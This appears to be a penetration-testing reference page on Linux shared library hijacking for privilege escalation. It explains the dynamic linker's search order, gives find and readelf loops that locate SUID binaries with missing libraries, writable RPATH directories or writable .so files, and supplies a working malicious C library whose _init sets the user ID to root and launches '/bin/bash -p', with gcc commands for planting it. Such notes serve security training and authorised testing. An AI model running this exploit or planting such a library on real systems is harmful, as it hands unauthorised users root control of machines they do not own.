# Shared Library Hijacking

## Table of Contents

1. [Overview](#overview)
2. [How Shared Libraries Load](#how-shared-libraries-load)
3. [Finding Vulnerable Binaries](#finding-vulnerable-binaries)
4. [Exploitation](#exploitation)

---

## Overview

When a binary loads shared libraries (`.so` files), the dynamic linker searches for them in a specific order. If an attacker can place a malicious `.so` in a location that gets searched first, or supply a missing library, the binary will load attacker-controlled code. Main attack vectors:

1. **Writable RPATH/RUNPATH directory** — the binary has an embedded search path pointing to a directory we can write to (we don't modify the binary, we write to the directory it references)
2. **Missing library** — the binary tries to load a `.so` that doesn't exist; we provide it
3. **Writable `.so` file** — the library file itself has weak permissions; we replace it

> **Note:** `LD_PRELOAD` hijacking is a related but distinct technique, covered in [ld-preload.md](ld-preload.md).

## How Shared Libraries Load

The dynamic linker (`ld-linux.so`) resolves shared libraries in this order:

1. `LD_LIBRARY_PATH` (ignored for SUID/SGID binaries)
2. `RPATH` embedded in the binary (deprecated in favor of RUNPATH)
3. `RUNPATH` embedded in the binary
4. `/etc/ld.so.cache` (built from `/etc/ld.so.conf` and `/etc/ld.so.conf.d/`)
5. Default paths: `/lib`, `/usr/lib`

```bash
# View libraries a binary needs
ldd /path/to/binary

# View RPATH/RUNPATH embedded in the binary
readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH'

# View the full resolution with debug info
LD_DEBUG=libs /path/to/binary 2>&1 | head -50
```

## Finding Vulnerable Binaries

### Missing libraries

```bash
# Find SUID binaries with missing libraries
find / -perm -4000 -type f 2>/dev/null | while read bin; do
    missing=$(ldd "$bin" 2>/dev/null | grep "not found")
    [ -n "$missing" ] && echo "$bin: $missing"
done
```

### Writable RPATH/RUNPATH directories

```bash
# Check if RPATH/RUNPATH points to a writable directory
find / -perm -4000 -type f 2>/dev/null | while read bin; do
    paths=$(readelf -d "$bin" 2>/dev/null | grep -oP '(RPATH|RUNPATH).*\[(.+)\]' | grep -oP '\[.+\]')
    [ -n "$paths" ] && echo "$bin: $paths"
done
```

Then check if those directories are writable by your user.

### Writable `.so` files

```bash
# Find shared libraries writable by current user
find / -name "*.so*" -writable 2>/dev/null
```

## Exploitation

### Missing library

1. Identify the missing library:

```bash
ldd /path/to/suid_binary
#   libcustom.so => not found
```

2. Create a malicious shared library:

```c
// malicious.c
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

3. Compile and place it where the linker will find it:

```bash
gcc -fPIC -shared -nostartfiles -o /path/searched/libcustom.so malicious.c
```

4. Run the vulnerable binary.

### Writable RPATH directory

1. Check the binary's RPATH:

```bash
readelf -d /path/to/suid_binary | grep RPATH
#   0x000000000000000f (RPATH)    Library rpath: [/opt/app/lib]
```

2. If `/opt/app/lib` is writable, check which libraries the binary loads from there:

```bash
ldd /path/to/suid_binary
```

3. Place a malicious `.so` with the correct name in that directory (same compile steps as above).

### Writable `.so` file

If the original library file has weak permissions, simply replace it:

```bash
# Back up (optional) then overwrite
gcc -fPIC -shared -nostartfiles -o /path/to/writable_lib.so malicious.c
```

Any binary that loads this library will execute the injected code.
